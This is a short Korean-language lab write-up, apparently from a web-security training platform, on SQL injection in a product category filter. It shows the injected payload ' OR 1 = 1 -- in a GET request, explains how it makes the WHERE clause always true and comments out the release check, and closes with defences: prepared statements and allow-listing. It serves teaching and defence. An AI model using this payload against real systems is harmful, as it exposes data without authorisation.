# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 개요
- 취약점: SQL Injection
- 난이도: Apprentice
- 목표: 카테고리 필터를 이용한 숨겨진 상품 데이터 조회

## 공격 흐름
### 1. 카테고리 필터 조회 확인
```http
GET /filter?category=Gifts HTTP/1.1
```
- 필터 선택 시 해당 요청이 발생하는 것을 확인

### 2. SQL Injection Payload 삽입
```sql
GET /filter?category=' OR 1 = 1 -- HTTP/1.1
```
- 위와 같이 카테고리 요청 파라미터 수정

### 3. 숨겨진 데이터 조회 성공
- `' OR 1 = 1` 조건이 항상 참(true)이 되면서, 모든 상품이 조회된다.

## 원리 분석
### 1. 기존 SQL 쿼리
```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```
- released 조건으로 인해 제한된 상품만 노출되는 것을 알 수 있다.

### 2. SQL Injection 공격 후
```sql
SELCT * FROM products
WHERE category = '' OR 1 = 1 --'
AND released = 1
```
- `OR 1 = 1`로 조건절이 항상 참이 된다.
- `AND released = 1` 부분이 주석처리 된다.
- 결과적으로 모든 상품 데이터 조회 가능

## 대응 방안
### 1. Prepared Statement 사용
- Prespared Statement 를 사용하면 사용자 입력값을 제외한 부분은 미리 컴파일 되기 때문에 사용자 입력값을 이용해 SQL 쿼리를 조작하는 것이 불가능 하다.
  ```python
  cursor.execute(
    "SELECT * FROM products WHERE category = %s", (category,)
  )
  ```

### 2. 입력값 검증
- 허용된 카테고리 값만 입력받도록 제한한다.
  ```
  category 필드에 'Gifts', 'Food' 등 특정 값 입력 시에만 처리하도록 제한
  ```
